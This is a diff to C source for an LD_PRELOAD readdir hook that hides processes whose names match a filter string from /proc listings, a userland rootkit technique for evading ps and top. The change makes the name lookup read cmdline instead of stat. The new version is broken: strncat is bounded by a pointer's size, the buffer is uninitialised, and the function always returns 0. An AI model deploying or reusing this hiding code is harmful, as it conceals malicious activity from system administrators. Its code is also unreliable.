@@ -1,6 +1,7 @@
 #define _GNU_SOURCE
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <dlfcn.h>
 #include <dirent.h>
 #include <string.h>
@@ -37,34 +38,58 @@ static int get_dir_name(DIR *dirp, char *buf, size_t size)
 /*
  * Get a process name given its pid
  */
-static int get_process_name(char *pid, char *buf)
+static int get_process_name(char *pid, char *buffer)
 {
     if (strspn(pid, "0123456789") != strlen(pid))
     {
         return 0;
     }
-
     char tmp[256];
-    snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
+    snprintf(tmp, sizeof(tmp), "/proc/%s/cmdline", pid);
 
-    FILE *f = fopen(tmp, "r");
+    FILE *f = fopen(tmp, "rb");
     if (f == NULL)
     {
         return 0;
     }
-
-    if (fgets(tmp, sizeof(tmp), f) == NULL)
+    char *arg = 0;
+    size_t size = 0;
+    while (getdelim(&arg, &size, 0, f) != -1)
     {
-        fclose(f);
-        return 0;
+        strncat(buffer, arg, sizeof(arg));
     }
-
+    free(arg);
     fclose(f);
-
-    int unused;
-    sscanf(tmp, "%d (%[^)]s", &unused, buf);
-    return 1;
+    return 0;
 }
+// static int get_process_name(char *pid, char *buf)
+// {
+//     if (strspn(pid, "0123456789") != strlen(pid))
+//     {
+//         return 0;
+//     }
+
+//     char tmp[256];
+//     snprintf(tmp, sizeof(tmp), "/proc/%s/stat", pid);
+
+//     FILE *f = fopen(tmp, "r");
+//     if (f == NULL)
+//     {
+//         return 0;
+//     }
+
+//     if (fgets(tmp, sizeof(tmp), f) == NULL)
+//     {
+//         fclose(f);
+//         return 0;
+//     }
+
+//     fclose(f);
+
+//     int unused;
+//     sscanf(tmp, "%d (%[^)]s", &unused, buf);
+//     return 1;
+// }
 
 #define DECLARE_READDIR(dirent, readdir)                              \
     static struct dirent *(*original_##readdir)(DIR *) = NULL;        \
@@ -88,12 +113,13 @@ static int get_process_name(char *pid, char *buf)
             if (dir)                                                  \
             {                                                         \
                 char dir_name[256];                                   \
-                char process_name[256];                               \
+                char process_name[500];                               \
                 if (get_dir_name(dirp, dir_name, sizeof(dir_name)) && \
                     strcmp(dir_name, "/proc") == 0 &&                 \
                     get_process_name(dir->d_name, process_name) &&    \
                     strstr(process_name, process_to_filter) != NULL)  \
                 {                                                     \
+                    memset(process_name, 0, sizeof(process_name));                \
                     continue;                                         \
                 }                                                     \
             }                                                         \
